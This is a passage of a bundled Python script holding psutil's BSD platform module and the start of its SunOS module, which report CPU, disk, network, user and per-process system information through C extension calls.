"""Return system per-CPU times as a namedtuple"""\n    user, nice, system, idle, irq = cext.cpu_times()\n    return scputimes(user, nice, system, idle, irq)\n\n\nif HAS_PER_CPU_TIMES:\n    def per_cpu_times():\n        """Return system CPU times as a namedtuple"""\n        ret = []\n        for cpu_t in cext.per_cpu_times():\n            user, nice, system, idle, irq = cpu_t\n            item = scputimes(user, nice, system, idle, irq)\n            ret.append(item)\n        return ret\nelse:\n    # XXX\n    # Ok, this is very dirty.\n    # On FreeBSD < 8 we cannot gather per-cpu information, see:\n    # https://github.com/giampaolo/psutil/issues/226\n    # If num cpus > 1, on first call we return single cpu times to avoid a\n    # crash at psutil import time.\n    # Next calls will fail with NotImplementedError\n    def per_cpu_times():\n        """Return system CPU times as a namedtuple"""\n        if cpu_count_logical() == 1:\n            return [cpu_times()]\n        if per_cpu_times.__called__:\n            raise NotImplementedError("supported only starting from FreeBSD 8")\n        per_cpu_times.__called__ = True\n        return [cpu_times()]\n\n    per_cpu_times.__called__ = False\n\n\ndef cpu_count_logical():\n    """Return the number of logical CPUs in the system."""\n    return cext.cpu_count_logical()\n\n\nif OPENBSD or NETBSD:\n    def cpu_count_cores():\n        # OpenBSD and NetBSD do not implement this.\n        return 1 if cpu_count_logical() == 1 else None\nelse:\n    def cpu_count_cores():\n        """Return the number of CPU cores in the system."""\n        # From the C module we\'ll get an XML string similar to this:\n        # http://manpages.ubuntu.com/manpages/precise/man4/smp.4freebsd.html\n        # We may get None in case "sysctl kern.sched.topology_spec"\n        # is not supported on this BSD version, in which case we\'ll mimic\n        # os.cpu_count() and return None.\n        ret = None\n        s = cext.cpu_topology()\n        if s is not None:\n            # get rid of padding chars appended at the end of the string\n            index = s.rfind("</groups>")\n            if index != -1:\n                s = s[:index + 9]\n                root = ET.fromstring(s)\n                try:\n                    ret = len(root.findall(\'group/children/group/cpu\')) or None\n                finally:\n                    # needed otherwise it will memleak\n                    root.clear()\n        if not ret:\n            # If logical CPUs == 1 it\'s obvious we\' have only 1 core.\n            if cpu_count_logical() == 1:\n                return 1\n        return ret\n\n\ndef cpu_stats():\n    """Return various CPU stats as a named tuple."""\n    if FREEBSD:\n        # Note: the C ext is returning some metrics we are not exposing:\n        # traps.\n        ctxsw, intrs, soft_intrs, syscalls, traps = cext.cpu_stats()\n    elif NETBSD:\n        # XXX\n        # Note about intrs: the C extension returns 0. intrs\n        # can be determined via /proc/stat; it has the same value as\n        # soft_intrs thought so the kernel is faking it (?).\n        #\n        # Note about syscalls: the C extension always sets it to 0 (?).\n        #\n        # Note: the C ext is returning some metrics we are not exposing:\n        # traps, faults and forks.\n        ctxsw, intrs, soft_intrs, syscalls, traps, faults, forks = \\\n            cext.cpu_stats()\n        with open(\'/proc/stat\', \'rb\') as f:\n            for line in f:\n                if line.startswith(b\'intr\'):\n                    intrs = int(line.split()[1])\n    elif OPENBSD:\n        # Note: the C ext is returning some metrics we are not exposing:\n        # traps, faults and forks.\n        ctxsw, intrs, soft_intrs, syscalls, traps, faults, forks = \\\n            cext.cpu_stats()\n    return _common.scpustats(ctxsw, intrs, soft_intrs, syscalls)\n\n\nif FREEBSD:\n    def cpu_freq():\n        """Return frequency metrics for CPUs. As of Dec 2018 only\n        CPU 0 appears to be supported by FreeBSD and all other cores\n        match the frequency of CPU 0.\n        """\n        ret = []\n        num_cpus = cpu_count_logical()\n        for cpu in range(num_cpus):\n            try:\n                current, available_freq = cext.cpu_freq(cpu)\n            except NotImplementedError:\n                continue\n            if available_freq:\n                try:\n                    min_freq = int(available_freq.split(" ")[-1].split("/")[0])\n                except(IndexError, ValueError):\n                    min_freq = None\n                try:\n                    max_freq = int(available_freq.split(" ")[0].split("/")[0])\n                except(IndexError, ValueError):\n                    max_freq = None\n            ret.append(_common.scpufreq(current, min_freq, max_freq))\n        return ret\nelif OPENBSD:\n    def cpu_freq():\n        curr = float(cext.cpu_freq())\n        return [_common.scpufreq(curr, 0.0, 0.0)]\n\n\n# =====================================================================\n# --- disks\n# =====================================================================\n\n\ndef disk_partitions(all=False):\n    """Return mounted disk partitions as a list of namedtuples.\n    \'all\' argument is ignored, see:\n    https://github.com/giampaolo/psutil/issues/906\n    """\n    retlist = []\n    partitions = cext.disk_partitions()\n    for partition in partitions:\n        device, mountpoint, fstype, opts = partition\n        maxfile = maxpath = None  # set later\n        ntuple = _common.sdiskpart(device, mountpoint, fstype, opts,\n                                   maxfile, maxpath)\n        retlist.append(ntuple)\n    return retlist\n\n\ndisk_usage = _psposix.disk_usage\ndisk_io_counters = cext.disk_io_counters\n\n\n# =====================================================================\n# --- network\n# =====================================================================\n\n\nnet_io_counters = cext.net_io_counters\nnet_if_addrs = cext_posix.net_if_addrs\n\n\ndef net_if_stats():\n    """Get NIC stats (isup, duplex, speed, mtu)."""\n    names = net_io_counters().keys()\n    ret = {}\n    for name in names:\n        try:\n            mtu = cext_posix.net_if_mtu(name)\n            isup = cext_posix.net_if_is_running(name)\n            duplex, speed = cext_posix.net_if_duplex_speed(name)\n        except OSError as err:\n            # https://github.com/giampaolo/psutil/issues/1279\n            if err.errno != errno.ENODEV:\n                raise\n        else:\n            if hasattr(_common, \'NicDuplex\'):\n                duplex = _common.NicDuplex(duplex)\n            ret[name] = _common.snicstats(isup, duplex, speed, mtu)\n    return ret\n\n\ndef net_connections(kind):\n    """System-wide network connections."""\n    if OPENBSD:\n        ret = []\n        for pid in pids():\n            try:\n                cons = Process(pid).connections(kind)\n            except (NoSuchProcess, ZombieProcess):\n                continue\n            else:\n                for conn in cons:\n                    conn = list(conn)\n                    conn.append(pid)\n                    ret.append(_common.sconn(*conn))\n        return ret\n\n    if kind not in _common.conn_tmap:\n        raise ValueError("invalid %r kind argument; choose between %s"\n                         % (kind, \', \'.join([repr(x) for x in conn_tmap])))\n    families, types = conn_tmap[kind]\n    ret = set()\n    if NETBSD:\n        rawlist = cext.net_connections(-1)\n    else:\n        rawlist = cext.net_connections()\n    for item in rawlist:\n        fd, fam, type, laddr, raddr, status, pid = item\n        # TODO: apply filter at C level\n        if fam in families and type in types:\n            nt = conn_to_ntuple(fd, fam, type, laddr, raddr, status,\n                                TCP_STATUSES, pid)\n            ret.add(nt)\n    return list(ret)\n\n\n# =====================================================================\n#  --- sensors\n# =====================================================================\n\n\nif FREEBSD:\n\n    def sensors_battery():\n        """Return battery info."""\n        try:\n            percent, minsleft, power_plugged = cext.sensors_battery()\n        except NotImplementedError:\n            # See: https://github.com/giampaolo/psutil/issues/1074\n            return None\n        power_plugged = power_plugged == 1\n        if power_plugged:\n            secsleft = _common.POWER_TIME_UNLIMITED\n        elif minsleft == -1:\n            secsleft = _common.POWER_TIME_UNKNOWN\n        else:\n            secsleft = minsleft * 60\n        return _common.sbattery(percent, secsleft, power_plugged)\n\n    def sensors_temperatures():\n        "Return CPU cores temperatures if available, else an empty dict."\n        ret = defaultdict(list)\n        num_cpus = cpu_count_logical()\n        for cpu in range(num_cpus):\n            try:\n                current, high = cext.sensors_cpu_temperature(cpu)\n                if high <= 0:\n                    high = None\n                name = "Core %s" % cpu\n                ret["coretemp"].append(\n                    _common.shwtemp(name, current, high, high))\n            except NotImplementedError:\n                pass\n\n        return ret\n\n\n# =====================================================================\n#  --- other system functions\n# =====================================================================\n\n\ndef boot_time():\n    """The system boot time expressed in seconds since the epoch."""\n    return cext.boot_time()\n\n\ndef users():\n    """Return currently connected users as a list of namedtuples."""\n    retlist = []\n    rawlist = cext.users()\n    for item in rawlist:\n        user, tty, hostname, tstamp, pid = item\n        if pid == -1:\n            assert OPENBSD\n            pid = None\n        if tty == \'~\':\n            continue  # reboot or shutdown\n        nt = _common.suser(user, tty or None, hostname, tstamp, pid)\n        retlist.append(nt)\n    return retlist\n\n\n# =====================================================================\n# --- processes\n# =====================================================================\n\n\n@memoize\ndef _pid_0_exists():\n    try:\n        Process(0).name()\n    except NoSuchProcess:\n        return False\n    except AccessDenied:\n        return True\n    else:\n        return True\n\n\ndef pids():\n    """Returns a list of PIDs currently running on the system."""\n    ret = cext.pids()\n    if OPENBSD and (0 not in ret) and _pid_0_exists():\n        # On OpenBSD the kernel does not return PID 0 (neither does\n        # ps) but it\'s actually querable (Process(0) will succeed).\n        ret.insert(0, 0)\n    return ret\n\n\nif OPENBSD or NETBSD:\n    def pid_exists(pid):\n        """Return True if pid exists."""\n        exists = _psposix.pid_exists(pid)\n        if not exists:\n            # We do this because _psposix.pid_exists() lies in case of\n            # zombie processes.\n            return pid in pids()\n        else:\n            return True\nelse:\n    pid_exists = _psposix.pid_exists\n\n\ndef is_zombie(pid):\n    try:\n        st = cext.proc_oneshot_info(pid)[kinfo_proc_map[\'status\']]\n        return st == cext.SZOMB\n    except Exception:\n        return False\n\n\ndef wrap_exceptions(fun):\n    """Decorator which translates bare OSError exceptions into\n    NoSuchProcess and AccessDenied.\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        try:\n            return fun(self, *args, **kwargs)\n        except ProcessLookupError:\n            if is_zombie(self.pid):\n                raise ZombieProcess(self.pid, self._name, self._ppid)\n            else:\n                raise NoSuchProcess(self.pid, self._name)\n        except PermissionError:\n            raise AccessDenied(self.pid, self._name)\n        except OSError:\n            if self.pid == 0:\n                if 0 in pids():\n                    raise AccessDenied(self.pid, self._name)\n                else:\n                    raise\n            raise\n    return wrapper\n\n\n@contextlib.contextmanager\ndef wrap_exceptions_procfs(inst):\n    """Same as above, for routines relying on reading /proc fs."""\n    try:\n        yield\n    except (ProcessLookupError, FileNotFoundError):\n        # ENOENT (no such file or directory) gets raised on open().\n        # ESRCH (no such process) can get raised on read() if\n        # process is gone in meantime.\n        if is_zombie(inst.pid):\n            raise ZombieProcess(inst.pid, inst._name, inst._ppid)\n        else:\n            raise NoSuchProcess(inst.pid, inst._name)\n    except PermissionError:\n        raise AccessDenied(inst.pid, inst._name)\n\n\nclass Process(object):\n    """Wrapper class around underlying C implementation."""\n\n    __slots__ = ["pid", "_name", "_ppid", "_cache"]\n\n    def __init__(self, pid):\n        self.pid = pid\n        self._name = None\n        self._ppid = None\n\n    def _assert_alive(self):\n        """Raise NSP if the process disappeared on us."""\n        # For those C function who do not raise NSP, possibly returning\n        # incorrect or incomplete result.\n        cext.proc_name(self.pid)\n\n    @wrap_exceptions\n    @memoize_when_activated\n    def oneshot(self):\n        """Retrieves multiple process info in one shot as a raw tuple."""\n        ret = cext.proc_oneshot_info(self.pid)\n        assert len(ret) == len(kinfo_proc_map)\n        return ret\n\n    def oneshot_enter(self):\n        self.oneshot.cache_activate(self)\n\n    def oneshot_exit(self):\n        self.oneshot.cache_deactivate(self)\n\n    @wrap_exceptions\n    def name(self):\n        name = self.oneshot()[kinfo_proc_map[\'name\']]\n        return name if name is not None else cext.proc_name(self.pid)\n\n    @wrap_exceptions\n    def exe(self):\n        if FREEBSD:\n            if self.pid == 0:\n                return \'\'  # else NSP\n            return cext.proc_exe(self.pid)\n        elif NETBSD:\n            if self.pid == 0:\n                # /proc/0 dir exists but /proc/0/exe doesn\'t\n                return ""\n            with wrap_exceptions_procfs(self):\n                return os.readlink("/proc/%s/exe" % self.pid)\n        else:\n            # OpenBSD: exe cannot be determined; references:\n            # https://chromium.googlesource.com/chromium/src/base/+/\n            #     master/base_paths_posix.cc\n            # We try our best guess by using which against the first\n            # cmdline arg (may return None).\n            cmdline = self.cmdline()\n            if cmdline:\n                return which(cmdline[0]) or ""\n            else:\n                return ""\n\n    @wrap_exceptions\n    def cmdline(self):\n        if OPENBSD and self.pid == 0:\n            return []  # ...else it crashes\n        elif NETBSD:\n            # XXX - most of the times the underlying sysctl() call on Net\n            # and Open BSD returns a truncated string.\n            # Also /proc/pid/cmdline behaves the same so it looks\n            # like this is a kernel bug.\n            try:\n                return cext.proc_cmdline(self.pid)\n            except OSError as err:\n                if err.errno == errno.EINVAL:\n                    if is_zombie(self.pid):\n                        raise ZombieProcess(self.pid, self._name, self._ppid)\n                    elif not pid_exists(self.pid):\n                        raise NoSuchProcess(self.pid, self._name, self._ppid)\n                    else:\n                        # XXX: this happens with unicode tests. It means the C\n                        # routine is unable to decode invalid unicode chars.\n                        return []\n                else:\n                    raise\n        else:\n            return cext.proc_cmdline(self.pid)\n\n    @wrap_exceptions\n    def environ(self):\n        return cext.proc_environ(self.pid)\n\n    @wrap_exceptions\n    def terminal(self):\n        tty_nr = self.oneshot()[kinfo_proc_map[\'ttynr\']]\n        tmap = _psposix.get_terminal_map()\n        try:\n            return tmap[tty_nr]\n        except KeyError:\n            return None\n\n    @wrap_exceptions\n    def ppid(self):\n        self._ppid = self.oneshot()[kinfo_proc_map[\'ppid\']]\n        return self._ppid\n\n    @wrap_exceptions\n    def uids(self):\n        rawtuple = self.oneshot()\n        return _common.puids(\n            rawtuple[kinfo_proc_map[\'real_uid\']],\n            rawtuple[kinfo_proc_map[\'effective_uid\']],\n            rawtuple[kinfo_proc_map[\'saved_uid\']])\n\n    @wrap_exceptions\n    def gids(self):\n        rawtuple = self.oneshot()\n        return _common.pgids(\n            rawtuple[kinfo_proc_map[\'real_gid\']],\n            rawtuple[kinfo_proc_map[\'effective_gid\']],\n            rawtuple[kinfo_proc_map[\'saved_gid\']])\n\n    @wrap_exceptions\n    def cpu_times(self):\n        rawtuple = self.oneshot()\n        return _common.pcputimes(\n            rawtuple[kinfo_proc_map[\'user_time\']],\n            rawtuple[kinfo_proc_map[\'sys_time\']],\n            rawtuple[kinfo_proc_map[\'ch_user_time\']],\n            rawtuple[kinfo_proc_map[\'ch_sys_time\']])\n\n    if FREEBSD:\n        @wrap_exceptions\n        def cpu_num(self):\n            return self.oneshot()[kinfo_proc_map[\'cpunum\']]\n\n    @wrap_exceptions\n    def memory_info(self):\n        rawtuple = self.oneshot()\n        return pmem(\n            rawtuple[kinfo_proc_map[\'rss\']],\n            rawtuple[kinfo_proc_map[\'vms\']],\n            rawtuple[kinfo_proc_map[\'memtext\']],\n            rawtuple[kinfo_proc_map[\'memdata\']],\n            rawtuple[kinfo_proc_map[\'memstack\']])\n\n    memory_full_info = memory_info\n\n    @wrap_exceptions\n    def create_time(self):\n        return self.oneshot()[kinfo_proc_map[\'create_time\']]\n\n    @wrap_exceptions\n    def num_threads(self):\n        if HAS_PROC_NUM_THREADS:\n            # FreeBSD\n            return cext.proc_num_threads(self.pid)\n        else:\n            return len(self.threads())\n\n    @wrap_exceptions\n    def num_ctx_switches(self):\n        rawtuple = self.oneshot()\n        return _common.pctxsw(\n            rawtuple[kinfo_proc_map[\'ctx_switches_vol\']],\n            rawtuple[kinfo_proc_map[\'ctx_switches_unvol\']])\n\n    @wrap_exceptions\n    def threads(self):\n        # Note: on OpenSBD this (/dev/mem) requires root access.\n        rawlist = cext.proc_threads(self.pid)\n        retlist = []\n        for thread_id, utime, stime in rawlist:\n            ntuple = _common.pthread(thread_id, utime, stime)\n            retlist.append(ntuple)\n        if OPENBSD:\n            self._assert_alive()\n        return retlist\n\n    @wrap_exceptions\n    def connections(self, kind=\'inet\'):\n        if kind not in conn_tmap:\n            raise ValueError("invalid %r kind argument; choose between %s"\n                             % (kind, \', \'.join([repr(x) for x in conn_tmap])))\n\n        if NETBSD:\n            families, types = conn_tmap[kind]\n            ret = []\n            rawlist = cext.net_connections(self.pid)\n            for item in rawlist:\n                fd, fam, type, laddr, raddr, status, pid = item\n                assert pid == self.pid\n                if fam in families and type in types:\n                    nt = conn_to_ntuple(fd, fam, type, laddr, raddr, status,\n                                        TCP_STATUSES)\n                    ret.append(nt)\n            self._assert_alive()\n            return list(ret)\n\n        families, types = conn_tmap[kind]\n        rawlist = cext.proc_connections(self.pid, families, types)\n        ret = []\n        for item in rawlist:\n            fd, fam, type, laddr, raddr, status = item\n            nt = conn_to_ntuple(fd, fam, type, laddr, raddr, status,\n                                TCP_STATUSES)\n            ret.append(nt)\n\n        if OPENBSD:\n            self._assert_alive()\n\n        return ret\n\n    @wrap_exceptions\n    def wait(self, timeout=None):\n        return _psposix.wait_pid(self.pid, timeout, self._name)\n\n    @wrap_exceptions\n    def nice_get(self):\n        return cext_posix.getpriority(self.pid)\n\n    @wrap_exceptions\n    def nice_set(self, value):\n        return cext_posix.setpriority(self.pid, value)\n\n    @wrap_exceptions\n    def status(self):\n        code = self.oneshot()[kinfo_proc_map[\'status\']]\n        # XXX is \'?\' legit? (we\'re not supposed to return it anyway)\n        return PROC_STATUSES.get(code, \'?\')\n\n    @wrap_exceptions\n    def io_counters(self):\n        rawtuple = self.oneshot()\n        return _common.pio(\n            rawtuple[kinfo_proc_map[\'read_io_count\']],\n            rawtuple[kinfo_proc_map[\'write_io_count\']],\n            -1,\n            -1)\n\n    @wrap_exceptions\n    def cwd(self):\n        """Return process current working directory."""\n        # sometimes we get an empty string, in which case we turn\n        # it into None\n        if OPENBSD and self.pid == 0:\n            return None  # ...else it would raise EINVAL\n        elif NETBSD or HAS_PROC_OPEN_FILES:\n            # FreeBSD < 8 does not support functions based on\n            # kinfo_getfile() and kinfo_getvmmap()\n            return cext.proc_cwd(self.pid) or None\n        else:\n            raise NotImplementedError(\n                "supported only starting from FreeBSD 8" if\n                FREEBSD else "")\n\n    nt_mmap_grouped = namedtuple(\n        \'mmap\', \'path rss, private, ref_count, shadow_count\')\n    nt_mmap_ext = namedtuple(\n        \'mmap\', \'addr, perms path rss, private, ref_count, shadow_count\')\n\n    def _not_implemented(self):\n        raise NotImplementedError\n\n    # FreeBSD < 8 does not support functions based on kinfo_getfile()\n    # and kinfo_getvmmap()\n    if HAS_PROC_OPEN_FILES:\n        @wrap_exceptions\n        def open_files(self):\n            """Return files opened by process as a list of namedtuples."""\n            rawlist = cext.proc_open_files(self.pid)\n            return [_common.popenfile(path, fd) for path, fd in rawlist]\n    else:\n        open_files = _not_implemented\n\n    # FreeBSD < 8 does not support functions based on kinfo_getfile()\n    # and kinfo_getvmmap()\n    if HAS_PROC_NUM_FDS:\n        @wrap_exceptions\n        def num_fds(self):\n            """Return the number of file descriptors opened by this process."""\n            ret = cext.proc_num_fds(self.pid)\n            if NETBSD:\n                self._assert_alive()\n            return ret\n    else:\n        num_fds = _not_implemented\n\n    # --- FreeBSD only APIs\n\n    if FREEBSD:\n\n        @wrap_exceptions\n        def cpu_affinity_get(self):\n            return cext.proc_cpu_affinity_get(self.pid)\n\n        @wrap_exceptions\n        def cpu_affinity_set(self, cpus):\n            # Pre-emptively check if CPUs are valid because the C\n            # function has a weird behavior in case of invalid CPUs,\n            # see: https://github.com/giampaolo/psutil/issues/586\n            allcpus = tuple(range(len(per_cpu_times())))\n            for cpu in cpus:\n                if cpu not in allcpus:\n                    raise ValueError("invalid CPU #%i (choose between %s)"\n                                     % (cpu, allcpus))\n            try:\n                cext.proc_cpu_affinity_set(self.pid, cpus)\n            except OSError as err:\n                # \'man cpuset_setaffinity\' about EDEADLK:\n                # <<the call would leave a thread without a valid CPU to run\n                # on because the set does not overlap with the thread\'s\n                # anonymous mask>>\n                if err.errno in (errno.EINVAL, errno.EDEADLK):\n                    for cpu in cpus:\n                        if cpu not in allcpus:\n                            raise ValueError(\n                                "invalid CPU #%i (choose between %s)" % (\n                                    cpu, allcpus))\n                raise\n\n        @wrap_exceptions\n        def memory_maps(self):\n            return cext.proc_memory_maps(self.pid)\n\n        @wrap_exceptions\n        def rlimit(self, resource, limits=None):\n            if limits is None:\n                return cext.proc_getrlimit(self.pid, resource)\n            else:\n                if len(limits) != 2:\n                    raise ValueError(\n                        "second argument must be a (soft, hard) tuple, "\n                        "got %s" % repr(limits))\n                soft, hard = limits\n                return cext.proc_setrlimit(self.pid, resource, soft, hard)\n')
    __stickytape_write_module('psutil/_pssunos.py', b'# Copyright (c) 2009, Giampaolo Rodola\'. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n"""Sun OS Solaris platform implementation."""\n\nimport errno\nimport functools\nimport os\nimport socket\nimport subprocess\nimport sys\nfrom collections import namedtuple\nfrom socket import AF_INET\n\nfrom . import _common\nfrom . import _psposix\nfrom . import _psutil_posix as cext_posix\nfrom . import _psutil_sunos as cext\nfrom ._common import AF_INET6\nfrom ._common import AccessDenied\nfrom ._common import NoSuchProcess\nfrom ._common import ZombieProcess\nfrom ._common import debug\nfrom ._common import get_procfs_path\nfrom ._common import isfile_strict\nfrom ._common import memoize_when_activated\nfrom ._common import sockfam_to_enum\nfrom ._common import socktype_to_enum\nfrom ._common import usage_percent\nfrom ._compat import PY3\nfrom ._compat import FileNotFoundError\nfrom ._compat import PermissionError\nfrom ._compat import ProcessLookupError\nfrom ._compat import b\n\n\n__extra__all__ = ["CONN_IDLE", "CONN_BOUND", "PROCFS_PATH"]\n\n\n# =====================================================================\n# --- globals\n# =====================================================================\n\n\nPAGE_SIZE = cext_posix.getpagesize()\nAF_LINK = cext_posix.AF_LINK\nIS_64_BIT = sys.maxsize > 2**32\n\nCONN_IDLE = "IDLE"\nCONN_BOUND = "BOUND"\n\nPROC_STATUSES = {\n    cext.SSLEEP: _common.STATUS_SLEEPING,\n    cext.SRUN: _common.STATUS_RUNNING,\n    cext.SZOMB: _common.STATUS_ZOMBIE,\n    cext.SSTOP: _common.STATUS_STOPPED,\n    cext.SIDL: _common.STATUS_IDLE,\n    cext.SONPROC: _common.STATUS_RUNNING,  # same as run\n    cext.SWAIT: _common.STATUS_WAITING,\n}\n\nTCP_STATUSES = {\n    cext.TCPS_ESTABLISHED: _common.CONN_ESTABLISHED,\n    cext.TCPS_SYN_SENT: _common.CONN_SYN_SENT,\n    cext.TCPS_SYN_RCVD: _common.CONN_SYN_RECV,\n    cext.TCPS_FIN_WAIT_1: _common.CONN_FIN_WAIT1,\n    cext.TCPS_FIN_WAIT_2: _common.CONN_FIN_WAIT2,\n    cext.TCPS_TIME_WAIT: _common.CONN_TIME_WAIT,\n    cext.TCPS_CLOSED: _common.CONN_CLOSE,\n    cext.TCPS_CLOSE_WAIT: _common.CONN_CLOSE_WAIT,\n    cext.TCPS_LAST_ACK: _common.CONN_LAST_ACK,\n    cext.TCPS_LISTEN: _common.CONN_LISTEN,\n    cext.TCPS_CLOSING: _common.CONN_CLOSING,\n    cext.PSUTIL_CONN_NONE: _common.CONN_NONE,\n    cext.TCPS_IDLE: CONN_IDLE,  # sunos specific\n    cext.TCPS_BOUND: CONN_BOUND,  # sunos specific\n}\n\nproc_info_map = dict(\n    ppid=0,\n    rss=1,\n    vms=2,\n    create_time=3,\n    nice=4,\n    num_threads=5,\n    status=6,\n    ttynr=7,\n    uid=8,\n    euid=9,\n    gid=10,\n    egid=11)\n\n\n# =====================================================================\n# --- named tuples\n# =====================================================================\n\n\n# psutil.cpu_times()\nscputimes = namedtuple(\'scputimes\', [\'user\', \'system\', \'idle\', \'iowait\'])\n# psutil.cpu_times(percpu=True)\npcputimes = namedtuple(\'pcputimes\',\n                       [\'user\', \'system\', \'children_user\', \'children_system\'])\n# psutil.virtual_memory()\nsvmem = namedtuple(\'svmem\', [\'total\', \'available\', \'percent\', \'used\', \'free\'])\n# psutil.Process.memory_info()\npmem = namedtuple(\'pmem\', [\'rss\', \'vms\'])\npfullmem = pmem\n# psutil.Process.memory_maps(grouped=True)\npmmap_grouped = namedtuple(\'pmmap_grouped\',\n                           [\'path\', \'rss\', \'anonymous\', \'locked\'])\n# psutil.Process.memory_maps(grouped=False)\npmmap_ext = namedtuple(\n    \'pmmap_ext\', \'addr perms \' + \' \'.join(pmmap_grouped._fields))\n\n\n# =====================================================================\n# --- memory\n# =====================================================================\n\n\ndef virtual_memory():\n    """Report virtual memory metrics."""\n    # we could have done this with kstat, but IMHO this is good enough\n    total = os.sysconf(\'SC_PHYS_PAGES\') * PAGE_SIZE\n    # note: there\'s no difference on Solaris\n    free = avail = os.sysconf(\'SC_AVPHYS_PAGES\') * PAGE_SIZE\n    used = total - free\n    percent = usage_percent(used, total, round_=1)\n    return svmem(total, avail, percent, used, free)\n\n\ndef swap_memory():\n    """Report swap memory metrics."""\n    sin, sout = cext.swap_mem()\n    # XXX\n    # we are supposed to get total/free by doing so:\n    # http://cvs.opensolaris.org/source/xref/onnv/onnv-gate/\n    #     usr/src/cmd/swap/swap.c\n    # ...nevertheless I can\'t manage to obtain the same numbers as \'swap\'\n    # cmdline utility, so let\'s parse its output (sigh!)\n    p = subprocess.Popen([\'/usr/bin/env\', \'PATH=/usr/sbin:/sbin:%s\' %\n                          os.environ[\'PATH\'], \'swap\', \'-l\'],\n                         stdout=subprocess.PIPE)\n    stdout, stderr = p.communicate()\n    if PY3:\n        stdout = stdout.decode(sys.stdout.encoding)\n    if p.returncode != 0:\n        raise RuntimeError("\'swap -l\' failed (retcode=%s)" % p.returncode)\n\n    lines = stdout.strip().split(\'\\n\')[1:]\n    if not lines:\n        raise RuntimeError(\'no swap device(s) configured\')\n    total = free = 0\n    for line in lines:\n        line = line.split()\n        t, f = line[3:5]\n        total += int(int(t) * 512)\n        free += int(int(f) * 512)\n    used = total - free\n    percent = usage_percent(used, total, round_=1)\n    return _common.sswap(total, used, free, percent,\n                         sin * PAGE_SIZE, sout * PAGE_SIZE)\n\n\n# =====================================================================\n# --- CPU\n# =====================================================================\n\n\ndef cpu_times():\n    """Return system-wide CPU times as a named tuple"""\n    ret = cext.per_cpu_times()\n    return scputimes(*[sum(x) for x in zip(*ret)])\n\n\ndef per_cpu_times():\n    """Return system per-CPU times as a list of named tuples"""\n    ret = cext.per_cpu_times()\n    return [scputimes(*x) for x in ret]\n\n\ndef cpu_count_logical():\n    """Return the number of logical CPUs in the system."""\n    try:\n        return os.sysconf("SC_NPROCESSORS_ONLN")\n    except ValueError:\n        # mimic os.cpu_count() behavior\n        return None\n\n\ndef cpu_count_cores():\n    """Return the number of CPU cores in the system."""\n    return cext.cpu_count_cores()\n\n\ndef cpu_stats():\n    """Return various CPU stats as a named tuple."""\n    ctx_switches, interrupts, syscalls, traps = cext.cpu_stats()\n    soft_interrupts = 0\n    return _common.scpustats(ctx_switches, interrupts, soft_interrupts,\n                             syscalls)\n\n\n# =====================================================================\n# --- disks\n# =====================================================================\n\n\ndisk_io_counters = cext.disk_io_counters\ndisk_usage = _psposix.disk_usage\n\n\ndef disk_partitions(all=False):\n    """Return system disk partitions."""\n    # TODO - the filtering logic should be better checked so that\n    # it tries to reflect \'df\' as much as possible\n    retlist = []\n    partitions = cext.disk_partitions()\n    for partition in partitions:\n        device, mountpoint, fstype, opts = partition\n        if device == \'none\':\n            device = \'\'\n        if not all:\n            # Differently from, say, Linux, we don\'t have a list of\n            # common fs types so the best we can do, AFAIK, is to\n            # filter by filesystem having a total size > 0.\n            try:\n                if not disk_usage(mountpoint).total:\n                    continue\n            except OSError as err:\n                # https://github.com/giampaolo/psutil/issues/1674\n                debug("skipping %r: %s" % (mountpoint, err))\n                continue\n        maxfile = maxpath = None  # set later\n        ntuple = _common.sdiskpart(device, mountpoint, fstype, opts,\n                                   maxfile, maxpath)\n        retlist.append(ntuple)\n    return retlist\n\n\n# =====================================================================\n# --- network\n# =====================================================================\n\n\nnet_io_counters = cext.net_io_counters\nnet_if_addrs = cext_posix.net_if_addrs\n\n\ndef net_connections(kind, _pid=-1):\n    """Return socket connections.  If pid == -1 return system-wide\n    connections (as opposed to connections opened by one process only).\n    Only INET sockets are returned (UNIX are not).\n    """\n    cmap = _common.conn_tmap.copy()\n    if _pid == -1:\n        cmap.pop(\'unix\', 0)\n    if kind not in cmap:\n        raise ValueError("invalid %r kind argument; choose between %s"\n                         % (kind, \', \'.join([repr(x) for x in cmap])))\n    families, types = _common.conn_tmap[kind]\n    rawlist = cext.net_connections(_pid)\n    ret = set()\n    for item in rawlist:\n        fd, fam, type_, laddr, raddr, status, pid = item\n        if fam not in families:\n            continue\n        if type_ not in types:\n            continue\n        # TODO: refactor and use _common.conn_to_ntuple.\n        if fam in (AF_INET, AF_INET6):\n            if laddr:\n                laddr = _common.addr(*laddr)\n            if raddr:\n                raddr = _common.addr(*raddr)\n        status = TCP_STATUSES[status]\n        fam = sockfam_to_enum(fam)\n        type_ = socktype_to_enum(type_)\n        if _pid == -1:\n            nt = _common.sconn(fd, fam, type_, laddr, raddr, status, pid)\n        else:\n            nt = _common.pconn(fd, fam, type_, laddr, raddr, status)\n        ret.add(nt)\n    return list(ret)\n\n\ndef net_if_stats():\n    """Get NIC stats (isup, duplex, speed, mtu)."""\n    ret = cext.net_if_stats()\n    for name, items in ret.items():\n        isup, duplex, speed, mtu = items\n        if hasattr(_common, \'NicDuplex\'):\n            duplex = _common.NicDuplex(duplex)\n        ret[name] = _common.snicstats(isup, duplex, speed, mtu)\n    return ret\n\n\n# =====================================================================\n# --- other system functions\n# =====================================================================\n\n\ndef boot_time():\n    """The system boot time expressed in seconds since the epoch."""\n    return cext.boot_time()\n\n\ndef users():\n    """Return currently connected users as a list of namedtuples."""\n    retlist = []\n    rawlist = cext.users()\n    localhost = (\':0.0\', \':0\')\n    for item in rawlist:\n        user, tty, hostname, tstamp, user_process, pid = item\n        # note: the underlying C function includes entries about\n        # system boot, run level and others.  We might want\n        # to use them in the future.\n        if not user_process:\n            continue\n        if hostname in localhost:\n            hostname = \'localhost\'\n        nt = _common.suser(user, tty, hostname, tstamp, pid)\n        retlist.append(nt)\n    return retlist\n\n\n# =====================================================================\n# --- processes\n# =====================================================================\n\n\ndef pids():\n    """Returns a list of PIDs currently running on the system."""\n    return [int(x) for x in os.listdir(b(get_procfs_path())) if x.isdigit()]\n\n\ndef pid_exists(pid):\n    """Check for the existence of a unix pid."""\n    return _psposix.pid_exists(pid)\n\n\ndef wrap_exceptions(fun):\n    """Call callable into a try/except clause and translate ENOENT,\n    EACCES and EPERM in NoSuchProcess or AccessDenied exceptions.\n    """\n    @functools.wraps(fun)\n    def wrapper(self, *args, **kwargs):\n        try:\n            return 